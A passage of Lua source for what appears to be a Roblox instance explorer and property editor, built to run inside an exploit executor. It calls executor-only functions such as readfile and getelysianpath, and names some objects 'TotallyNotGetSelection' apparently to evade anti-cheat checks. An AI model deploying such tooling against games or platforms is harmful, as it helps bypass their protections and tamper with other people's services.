umItem","Name":"Follow","tags":[],"Value":2,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"TouchCameraMovementMode"},{"type":"Enum","Name":"TouchMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"TouchMovementMode"},{"type":"Enum","Name":"TweenStatus","tags":[]},{"type":"EnumItem","Name":"Canceled","tags":[],"Value":0,"Enum":"TweenStatus"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":1,"Enum":"TweenStatus"},{"type":"Enum","Name":"UiMessageType","tags":[]},{"type":"EnumItem","Name":"UiMessageError","tags":[],"Value":0,"Enum":"UiMessageType"},{"type":"EnumItem","Name":"UiMessageInfo","tags":[],"Value":1,"Enum":"UiMessageType"},{"type":"Enum","Name":"UploadSetting","tags":[]},{"type":"EnumItem","Name":"Never","tags":[],"Value":0,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Ask","tags":[],"Value":1,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"UploadSetting"},{"type":"Enum","Name":"UserCFrame","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":1,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":2,"Enum":"UserCFrame"},{"type":"Enum","Name":"UserInputState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Change","tags":[],"Value":1,"Enum":"UserInputState"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Cancel","tags":[],"Value":3,"Enum":"UserInputState"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"UserInputState"},{"type":"Enum","Name":"UserInputType","tags":[]},{"type":"EnumItem","Name":"MouseButton1","tags":[],"Value":0,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton2","tags":[],"Value":1,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton3","tags":[],"Value":2,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseWheel","tags":[],"Value":3,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseMovement","tags":[],"Value":4,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Touch","tags":[],"Value":7,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Keyboard","tags":[],"Value":8,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Focus","tags":[],"Value":9,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Accelerometer","tags":[],"Value":10,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gyro","tags":[],"Value":11,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad1","tags":[],"Value":12,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad2","tags":[],"Value":13,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad3","tags":[],"Value":14,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad4","tags":[],"Value":15,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad5","tags":[],"Value":16,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad6","tags":[],"Value":17,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad7","tags":[],"Value":18,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad8","tags":[],"Value":19,"Enum":"UserInputType"},{"type":"EnumItem","Name":"TextInput","tags":[],"Value":20,"Enum":"UserInputType"},{"type":"EnumItem","Name":"None","tags":[],"Value":21,"Enum":"UserInputType"},{"type":"Enum","Name":"VibrationMotor","tags":[]},{"type":"EnumItem","Name":"Large","tags":[],"Value":0,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftTrigger","tags":[],"Value":2,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightTrigger","tags":[],"Value":3,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":4,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":5,"Enum":"VibrationMotor"},{"type":"Enum","Name":"VideoQualitySettings","tags":[]},{"type":"EnumItem","Name":"LowResolution","tags":[],"Value":0,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"MediumResolution","tags":[],"Value":1,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"HighResolution","tags":[],"Value":2,"Enum":"VideoQualitySettings"},{"type":"Enum","Name":"WaterDirection","tags":[]},{"type":"EnumItem","Name":"NegX","tags":[],"Value":0,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegY","tags":[],"Value":2,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Y","tags":[],"Value":3,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":4,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Z","tags":[],"Value":5,"Enum":"WaterDirection"},{"type":"Enum","Name":"WaterForce","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Strong","tags":[],"Value":3,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Max","tags":[],"Value":4,"Enum":"WaterForce"}]
]===]
			return rawApiJson
		end

		function getCurrentApiJson()
			local jsonStr = nil
			if readfile and getelysianpath then
				if readfile(getelysianpath().."Xpl0rerApi.txt") then
					print("Api found in folder!")
					jsonStr = readfile(getelysianpath().."Xpl0rerApi.txt")
					return jsonStr
				end
			end
			local success, err = pcall(function()
				jsonStr = httpGet(apiUrl)
				print("Fetched json successfully")
			end)
			if success then
				print("Returning json")
				--print(jsonStr:sub(1,500))
				return jsonStr
			else
				print("Error fetching json: " .. tostring(err))
				print("Falling back to local copy")
				return getLocalApiJson()
			end
		end

		function splitStringIntoChunks(jsonStr)
			-- Splits up a string into a table with a given size
			local t = {}
			for i = 1, math.ceil(string.len(jsonStr)/maxChunkSize) do
				local str = jsonStr:sub((i-1)*maxChunkSize+1, i*maxChunkSize)
				table.insert(t, str)
			end
			return t
		end

		local jsonToParse = getCurrentApiJson()
		local apiChunks = splitStringIntoChunks(jsonToParse)

		function getRbxApi()
--[[
	Api.Classes
	Api.Enums
	Api.GetProperties(className)
	Api.IsEnum(valueType)
--]]

			-- Services
			local HttpService = game:GetService("HttpService")
			local ServerStorage = game:GetService("ServerStorage")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")

			-- Remotes
			--local Remotes = ReplicatedStorage:WaitForChild("OnlineStudio"):WaitForChild("Remotes")
			--local GetApiJsonFunction = Remotes:WaitForChild("GetApiJson")

			-- Functions
			local JsonDecode = function(s) return HttpService:JSONDecode(s) end

			local function GetApiRemoteFunction(index)
				if (apiChunks[index]) then 
					return apiChunks[index], #apiChunks
				else
					print("Bad index for GetApiJson")
					return nil
				end
			end

			local function getApiJson()
				local apiTable = {}
				local firstPage, pageCount = GetApiRemoteFunction(1)
				table.insert(apiTable, firstPage)
				for i = 2, pageCount do
					--print("Fetching API page # " .. tostring(i))
					local result = GetApiRemoteFunction(i)
					table.insert(apiTable, result)
				end
				return table.concat(apiTable)
			end

			local json = getApiJson()
			local apiDump =  JsonDecode(json)

			local Classes = {}
			local Enums = {}

			local function sortAlphabetic(t, property)
				table.sort(t, 
					function(x,y) return x[property] < y[property]
					end)
			end

			local function isEnum(name)
				return Enums[name] ~= nil
			end

			local function getProperties(className)
				local class = Classes[className]
				local properties = {}

				if not class then return properties end

				while class do
					for _,property in pairs(class.Properties) do
						table.insert(properties, property)
					end
					class = Classes[class.Superclass]
				end

				sortAlphabetic(properties, "Name")

				return properties
			end

			for _,item in pairs(apiDump) do
				local itemType = item.type
				-- Classes --
				if (itemType == 'Class') then
					Classes[item.Name] = item
					item.Properties = {}
					item.Functions = {}
					item.YieldFunctions = {}
					item.Events = {}
					item.Callbacks = {}
					-- Members --
				elseif (itemType == 'Property') then
					table.insert(Classes[item.Class].Properties, item)
				elseif (itemType == 'Function') then
					table.insert(Classes[item.Class].Functions, item)
				elseif (itemType == 'YieldFunction') then
					table.insert(Classes[item.Class].YieldFunctions, item)
				elseif (itemType == 'Event') then
					table.insert(Classes[item.Class].Events, item)
				elseif (itemType == 'Callback') then
					table.insert(Classes[item.Class].Callbacks, item)
					-- Enums --
				elseif (itemType == 'Enum') then
					Enums[item.Name] = item
					item.EnumItems = {}
				elseif (itemType == 'EnumItem') then
					Enums[item.Enum].EnumItems[item.Name] = item
				end
			end

			return {
				Classes = Classes;
				Enums = Enums;
				GetProperties = getProperties;
				IsEnum = isEnum;
			}
		end

		-- Modules
		local Permissions = {CanEdit = true}
		local RbxApi = getRbxApi()

--[[
	RbxApi.Classes
	RbxApi.Enums
	RbxApi.GetProperties(className)
	RbxApi.IsEnum(valueType)
--]]

		-- Styles

		local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

		local Styles = {
			Font = Enum.Font.Arial;
			Margin = 5;
			Black = CreateColor3(0,0,0);
			White = CreateColor3(255,255,255);
		}

		local Row = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextXAlignment = Enum.TextXAlignment.Left;
			TextColor = Styles.Black;
			TextColorOver = Styles.White;
			TextLockedColor = CreateColor3(120,120,120);
			Height = 24;
			BorderColor = CreateColor3(216,216,216);
			BackgroundColor = Styles.White;
			BackgroundColorAlternate = CreateColor3(246,246,246);
			BackgroundColorMouseover = CreateColor3(211,224,244);
			TitleMarginLeft = 15;
		}

		local DropDown = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextColor = CreateColor3(0,0,0);
			TextColorOver = Styles.White;
			TextXAlignment = Enum.TextXAlignment.Left;
			Height = 16;
			BackColor = Styles.White;
			BackColorOver = CreateColor3(86,125,188);
			BorderColor = CreateColor3(216,216,216);
			BorderSizePixel = 2;
			ArrowColor = CreateColor3(160,160,160);
			ArrowColorOver = Styles.Black;
		}

		local BrickColors = {
			BoxSize = 13;
			BorderSizePixel = 1;
			BorderColor = CreateColor3(160,160,160);
			FrameColor = CreateColor3(160,160,160);
			Size = 20;
			Padding = 4;
			ColorsPerRow = 8;
			OuterBorder = 1;
			OuterBorderColor = Styles.Black;
		}

		wait(1)

		local Gui = D_E_X
		local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
		local ExplorerFrame = Gui:WaitForChild("ExplorerPanel")

		local bindGetSelection = ExplorerFrame.TotallyNotGetSelection
		local bindSelectionChanged = ExplorerFrame.TotallyNotSelectionChanged
		local bindGetApi = PropertiesFrame.GetApi
		local bindGetAwait = PropertiesFrame.GetAwaiting
		local bindSetAwait = PropertiesFrame.SetAwaiting

		local ContentUrl = ContentProvider.BaseUrl .. "asset/?id="

		local SettingsRemote = Gui:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")

		local propertiesSearch = PropertiesFrame.Header.TextBox

		local AwaitingObjectValue = false
		local AwaitingObjectObj
		local AwaitingObjectProp

		function searchingProperties()
			if propertiesSearch.Text ~= "" and propertiesSearch.Text ~= "Search Properties" then
				return true
			end
			return false
		end

		local function GetSelection()
			local selection = bindGetSelection:Invoke()
			if #selection == 0 then
				return nil
			else
				return selection
			end 
		end

		-- Number

		local function Round(number, decimalPlaces)
			return tonumber(string.format("%." .. (decimalPlaces or 0) .. "f", number))
		end

		-- Strings

		local function Split(str, delimiter)
			local start = 1
			local t = {}
			while true do
				local pos = string.find (str, delimiter, start, true)
				if not pos then
					break
				end
				table.insert (t, string.sub (str, start, pos - 1))
				start = pos + string.len (delimiter)
			end
			table.insert (t, string.sub (str, start))
			return t
		end

		-- Data Type Handling

		local function ToString(value, type)
			if type == "float" then
				return tostring(Round(value,2))
			elseif type == "Content" then
				if string.find(value,"/asset") then
					local match = string.find(value, "=") + 1
					local id = string.sub(value, match)
					return id
				else
					return tostring(value)
				end
			elseif type == "Vector2" then
				local x = value.x
				local y = value.y
				return string.format("%g, %g", x,y)
			elseif type == "Vector3" then
				local x = value.x
				local y = value.y
				local z = value.z
				return string.format("%g, %g, %g", x,y,z)
			elseif type == "Color3" then
				local r = value.r
				local g = value.g
				local b = value.b
				return string.format("%d, %d, %d", r*255,g*255,b*255)
			elseif type == "UDim2" then
				local xScale = value.X.Scale
				local xOffset = value.X.Offset
				local yScale = value.Y.Scale
				local yOffset = value.Y.Offset
				return string.format("{%d, %d}, {%d, %d}", xScale, xOffset, yScale, yOffset)
			else
				return tostring(value)
			end
		end

		local function ToValue(value,type)
			if type == "Vector2" then
				local list = Split(value,",")
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return Vector2.new(x,y)
			elseif type == "Vector3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				local z = tonumber(list[3]) or 0
				return Vector3.new(x,y,z)
			elseif type == "Color3" then
				local list = Split(value,",")
				if #list < 3 then return nil end
				local r = tonumber(list[1]) or 0
				local g = tonumber(list[2]) or 0
				local b = tonumber(list[3]) or 0
				return Color3.new(r/255,g/255, b/255)
			elseif type == "UDim2" then
				local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
				if #list < 4 then return nil end
				local xScale = tonumber(list[1]) or 0
				local xOffset = tonumber(list[2]) or 0
				local yScale = tonumber(list[3]) or 0
				local yOffset = tonumber(list[4]) or 0
				return UDim2.new(xScale, xOffset, yScale, yOffset)
			elseif type == "Content" then
				if tonumber(value) ~= nil then
					value = ContentUrl .. value
				end
				return value
			elseif type == "float" or type == "int" or type == "double" then
				return tonumber(value)
			elseif type == "string" then
				return value
			elseif type == "NumberRange" then
				local list = Split(value,",")
				if #list == 1 then
					if tonumber(list[1]) == nil then return nil end
					local newVal = tonumber(list[1]) or 0
					return NumberRange.new(newVal)
				end
				if #list < 2 then return nil end
				local x = tonumber(list[1]) or 0
				local y = tonumber(list[2]) or 0
				return NumberRange.new(x,y)
			else
				return nil
			end
		end


		-- Tables

		local function CopyTable(T)
			local t2 = {}
			for k,v in pairs(T) do
				t2[k] = v
			end
			return t2
		end

		local function SortTable(T)
			table.sort(T, 
				function(x,y) return x.Name < y.Name
				end)
		end

		-- Spritesheet
		local Sprite = {
			Width = 13;
			Height = 13;
		}

		local Spritesheet = {
			Image = "http://www.roblox.com/asset/?id=128896947";
			Height = 256;
			Width = 256;
		}

		local Images = {
			"unchecked",
			"checked",
			"unchecked_over",
			"checked_over",
			"unchecked_disabled",
			"checked_disabled"
		}

		local function SpritePosition(spriteName)
			local x = 0
			local y = 0
			for i,v in pairs(Images) do
				if (v == spriteName) then
					return {x, y}
				end
				x = x + Sprite.Height
				if (x + Sprite.Width) > Spritesheet.Width then
					x = 0
					y = y + Sprite.Height
				end
			end
		end

		local function GetCheckboxImageName(checked, readOnly, mouseover)
			if checked then
				if readOnly then
					return "checked_disabled"
				elseif mouseover then
					return "checked_over"
				else
					return "checked"
				end
			else
				if readOnly then
					return "unchecked_disabled"
				elseif mouseover then
					return "unchecked_over"
				else
					return "unchecked"
				end
			end
		end

		local MAP_ID = 418720155

		-- Gui Controls --

		---- IconMap ----
		-- Image size: 256px x 256px
		-- Icon size: 16px x 16px
		-- Padding between each icon: 2px
		-- Padding around image edge: 1px
		-- Total icons: 14 x 14 (196)
		local Icon do
			local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
			game:GetService('ContentProvider'):Preload(iconMap)
			local iconDehash do
				-- 14 x 14, 0-based input, 0-based output
				local f=math.floor
				function iconDehash(h)
					return f(h/14%14),f(h%14)
				end
			end

			function Icon(IconFrame,index)
				local row,col = iconDehash(index)
				local mapSize = Vector2.new(256,256)
				local pad,border = 2,1
				local iconSize = 16

				local class = 'Frame'
				if type(IconFrame) == 'string' then
					class = IconFrame
					IconFrame = nil
				end

				if not IconFrame then
					IconFrame = Create(class,{
						Name = "Icon";
						BackgroundTransparency = 1;
						ClipsDescendants = true;
						Create('ImageLabel',{
							Name = "IconMap";
							Active = false;
							BackgroundTransparency = 1;
							Image = iconMap;
							Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
						});
					})
				end

				IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
				return IconFrame
			end
		end

		local function CreateCell()
			local tableCell = Instance.new("Frame")
			tableCell.Size = UDim2.new(0.5, -1, 1, 0)
			tableCell.BackgroundColor3 = Row.BackgroundColor
			tableCell.BorderColor3 = Row.BorderColor
			return tableCell
		end

		local function CreateLabel(readOnly)
			local label = Instance.new("TextLabel")
			label.Font = Row.Font
			label.FontSize = Row.FontSize
			label.TextXAlignment = Row.TextXAlignment
			label.BackgroundTransparency = 1

			if readOnly then
				label.TextColor3 = Row.TextLockedColor
			else
				label.TextColor3 = Row.TextColor
			end
			return label
		end

		local function CreateTextButton(readOnly, onClick)
			local button = Instance.new("TextButton")
			button.Font = Row.Font
			button.FontSize = Row.FontSize
			button.TextXAlignment = Row.TextXAlignment
			button.BackgroundTransparency = 1
			if readOnly then
				button.TextColor3 = Row.TextLockedColor
			else
				button.TextColor3 = Row.TextColor
				button.MouseButton1Click:connect(function()
					onClick()
				end)
			end
			return button
		end

		local function CreateObject(readOnly)
			local button = Instance.new("TextButton")
			button.Font = Row.Font
			button.FontSize = Row.FontSize
			button.TextXAlignment = Row.TextXAlignment
			button.BackgroundTransparency = 1
			if readOnly then
				button.TextColor3 = Row.TextLockedColor
			else
				button.TextColor3 = Row.TextColor
			end
			local cancel = Create(Icon('ImageButton',177),{
				Name = "Cancel";
				Visible = false;
				Position = UDim2.new(1,-20,0,0);
				Size = UDim2.new(0,20,0,20);
				Parent = button;
			})
			return button
		end

		local function CreateTextBox(readOnly)
			if readOnly then
				local box = CreateLabel(readOnly)
				return box
			else
				local box = Instance.new("TextBox")
				if not SettingsRemote:Invoke("ClearProps") then
					box.ClearTextOnFocus = false
				end
				box.Font = Row.Font
				box.FontSize = Row.FontSize
				box.TextXAlignment = Row.TextXAlignment
				box.BackgroundTransparency = 1
				box.TextColor3 = Row.TextColor
				return box
			end
		end

		local function CreateDropDownItem(text, onClick)
			local button = Instance.new("TextButton")
			button.Font = DropDown.Font
			button.FontSize = DropDown.FontSize
			button.TextColor3 = DropDown.TextColor
			button.TextXAlignment = DropDown.TextXAlignment
			button.BackgroundColor3 = DropDown.BackColor
			button.AutoButtonColor = false
			button.BorderSizePixel = 0
			button.Active = true
			button.Text = text

			button.MouseEnter:connect(function()
				button.TextColor3 = DropDown.TextColorOver
				button.BackgroundColor3 = DropDown.BackColorOver
			end)
			button.MouseLeave:connect(function()
				button.TextColor3 = DropDown.TextColor
				button.BackgroundColor3 = DropDown.BackColor
			end)
			button.MouseButton1Click:connect(function()
				onClick(text)
			end)	
			return button
		end

		local function CreateDropDown(choices, currentChoice, readOnly, onClick)
			local frame = Instance.new("Frame")	
			frame.Name = "DropDown"
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

			local button = Instance.new("TextButton")
			button.Font = Row.Font
			button.FontSize = Row.FontSize
			button.TextXAlignment = Row.TextXAlignment
			button.BackgroundTransparency = 1
			button.TextColor3 = Row.TextColor
			if readOnly then
				button.TextColor3 = Row.TextLockedColor
			end
			button.Text = currentChoice
			button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
			button.Position = UDim2.new(0, Styles.Margin, 0, 0)
			button.Parent = frame

			local function showArrow(color)
				if arrow then arrow:Destroy() end

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = color;
				})
				local graphicSize = 16/2

				arrow = ArrowGraphic(graphicSize,'Down',true,graphicTemplate)
				arrow.Position = UDim2.new(1,-graphicSize * 2,0.5,-graphicSize/2)
				arrow.Parent = frame
			end

			local function hideMenu()
				expanded = false
				showArrow(DropDown.ArrowColor)
				if menu then menu:Destroy() end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("Frame")
				menu.Size = UDim2.new(1, -2 * margin, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, Row.Height + margin)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				local parentFrameHeight = menu.Parent.Parent.Parent.Parent.Size.Y.Offset
				local rowHeight = menu.Parent.Parent.Parent.Position.Y.Offset
				if (rowHeight + menu.Size.Y.Offset) > math.max(parentFrameHeight,PropertiesFrame.AbsoluteSize.y) then
					menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateDropDownItem(name, function()
						choice(name)
					end)
					option.Size = UDim2.new(1, 0, 0, 16)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end

			showArrow(DropDown.ArrowColor)

			if not readOnly then

				button.MouseEnter:connect(function()
					button.TextColor3 = Row.TextColor
					showArrow(DropDown.ArrowColorOver)
				end)
				button.MouseLeave:connect(function()
					button.TextColor3 = Row.TextColor
					if not expanded then
						showArrow(DropDown.ArrowColor)
					end
				end)
				button.MouseButton1Click:connect(function()
					if expanded then
						hideMenu()
					else
						showMenu()
					end
				end)
			end

			return frame,button
		end

		local function CreateBrickColor(readOnly, onClick)
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(1,0,1,0)
			frame.BackgroundTransparency = 1

			local colorPalette = Instance.new("Frame")
			colorPalette.BackgroundTransparency = 0
			colorPalette.SizeConstraint = Enum.SizeConstraint.RelativeXX
			colorPalette.Size = UDim2.new(1, -2 * BrickColors.OuterBorder, 1, -2 * BrickColors.OuterBorder)
			colorPalette.BorderSizePixel = BrickColors.BorderSizePixel
			colorPalette.BorderColor3 = BrickColors.BorderColor
			colorPalette.Position = UDim2.new(0, BrickColors.OuterBorder, 0, BrickColors.OuterBorder + Row.Height)
			colorPalette.ZIndex = 5
			colorPalette.Visible = false
			colorPalette.BorderSizePixel = BrickColors.OuterBorder
			colorPalette.BorderColor3 = BrickColors.OuterBorderColor
			colorPalette.Parent = frame

			local function show()
				colorPalette.Visible = true
			end

			local function hide()
				colorPalette.Visible = false
			end

			local function toggle()
				colorPalette.Visible = not colorPalette.Visible
			end

			local colorBox = Instance.new("TextButton", frame)
			colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
			colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
			colorBox.Text = ""
			colorBox.MouseButton1Click:connect(function()
				if not readOnly then
					toggle()
				end
			end)

			if readOnly then
				colorBox.AutoButtonColor = false
			end

			local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize

			local propertyLabel = CreateTextButton(readOnly, function()
				if not readOnly then
					toggle()
				end
			end)
			propertyLabel.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
			propertyLabel.Position = UDim2.new(0, spacingBefore, 0, 0)
			propertyLabel.Parent = frame

			local size = (1 / BrickColors.ColorsPerRow)

			for index = 0, 127 do
				local brickColor = BrickColor.palette(index)
				local color3 = brickColor.Color

				local x = size * (index % BrickColors.ColorsPerRow)
				local y = size * math.floor(index / BrickColors.ColorsPerRow)

				local brickColorBox = Instance.new("TextButton")
				brickColorBox.Text = ""
				brickColorBox.Size = UDim2.new(size,0,size,0)
				brickColorBox.BackgroundColor3 = color3
				brickColorBox.Position = UDim2.new(x, 0, y, 0)
				brickColorBox.ZIndex = colorPalette.ZIndex
				brickColorBox.Parent = colorPalette

				brickColorBox.MouseButton1Click:connect(function()
					hide()
					onClick(brickColor)
				end)
			end

			return frame,propertyLabel,colorBox
		end

		local function CreateColor3Control(readOnly, onClick)
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(1,0,1,0)
			frame.BackgroundTransparency = 1

			local colorBox = Instance.new("TextButton", frame)
			colorBox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)
			colorBox.Size = UDim2.new(0, BrickColors.BoxSize, 0, BrickColors.BoxSize)
			colorBox.Text = ""
			colorBox.AutoButtonColor = false

			local spacingBefore = (Styles.Margin * 2) + BrickColors.BoxSize
			local box = CreateTextBox(readOnly)
			box.Size = UDim2.new(1, (-1 * spacingBefore) - Styles.Margin, 1, 0)
			box.Position = UDim2.new(0, spacingBefore, 0, 0)
			box.Parent = frame

			return frame,box,colorBox
		end

		function CreateCheckbox(value, readOnly, onClick)
			local checked = value
			local mouseover = false

			local checkboxFrame = Instance.new("ImageButton")
			checkboxFrame.Size = UDim2.new(0, Sprite.Width, 0, Sprite.Height)
			checkboxFrame.BackgroundTransparency = 1
			checkboxFrame.ClipsDescendants = true
			--checkboxFrame.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

			local spritesheetImage = Instance.new("ImageLabel", checkboxFrame)
			spritesheetImage.Name = "SpritesheetImageLabel"
			spritesheetImage.Size = UDim2.new(0, Spritesheet.Width, 0, Spritesheet.Height)
			spritesheetImage.Image = Spritesheet.Image
			spritesheetImage.BackgroundTransparency = 1

			local function updateSprite()
				local spriteName = GetCheckboxImageName(checked, readOnly, mouseover)
				local spritePosition = SpritePosition(spriteName)
				spritesheetImage.Position = UDim2.new(0, -1 * spritePosition[1], 0, -1 * spritePosition[2])
			end

			local function setValue(val)
				checked = val
				updateSprite()
			end

			if not readOnly then
				checkboxFrame.MouseEnter:connect(function() mouseover = true updateSprite() end)
				checkboxFrame.MouseLeave:connect(function() mouseover = false updateSprite() end)
				checkboxFrame.MouseButton1Click:connect(function()
					onClick(checked)
				end)
			end

			updateSprite()

			return checkboxFrame, setValue
		end



		-- Code for handling controls of various data types --

		local Controls = {}

		Controls["default"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]

			local box = CreateTextBox(readOnly)
			box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
			box.Position = UDim2.new(0, Styles.Margin, 0, 0)

			local function update()
				local value = object[propertyName]
				box.Text = ToString(value, propertyType)
			end

			if not readOnly then
				box.FocusLost:connect(function(enterPressed)
					Set(object, propertyData, ToValue(box.Text,propertyType))
					update()
				end)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return box
		end

		Controls["bool"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
			local checked = object[propertyName]

			local checkbox, setValue = CreateCheckbox(checked, readOnly, function(value)
				Set(object, propertyData, not checked)
			end)
			checkbox.Position = UDim2.new(0, Styles.Margin, 0, Styles.Margin)

			setValue(checked)

			local function update()
				checked = object[propertyName]
				setValue(checked)
			end

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			if object:IsA("BoolValue") then
				object.Changed:connect(function(val)
					update()
				end)
			end

			update()

			return checkbox
		end

		Controls["BrickColor"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]

			local frame,label,brickColorBox = CreateBrickColor(readOnly, function(brickColor)
				Set(object, propertyData, brickColor)
			end)

			local function update()
				local value = object[propertyName]
				brickColorBox.BackgroundColor3 = value.Color
				label.Text = tostring(value)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return frame
		end

		Controls["Color3"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]

			local frame,textBox,colorBox = CreateColor3Control(readOnly)

			textBox.FocusLost:connect(function(enterPressed)
				Set(object, propertyData, ToValue(textBox.Text,"Color3"))
				local value = object[propertyName]
				colorBox.BackgroundColor3 = value
				textBox.Text = ToString(value, "Color3")
			end)

			local function update()
				local value = object[propertyName]
				colorBox.BackgroundColor3 = value
				textBox.Text = ToString(value, "Color3")
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return frame
		end

		Controls["Enum"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]

			local enumName = object[propertyName].Name

			local enumNames = {}
			for _,enum in pairs(Enum[tostring(propertyType)]:GetEnumItems()) do
				table.insert(enumNames, enum.Name)
			end

			local dropdown, propertyLabel = CreateDropDown(enumNames, enumName, readOnly, function(value)
				Set(object, propertyData, value)
			end)
			--dropdown.Parent = frame

			local function update()
				local value = object[propertyName].Name
				propertyLabel.Text = tostring(value)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return dropdown
		end

		Controls["Object"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
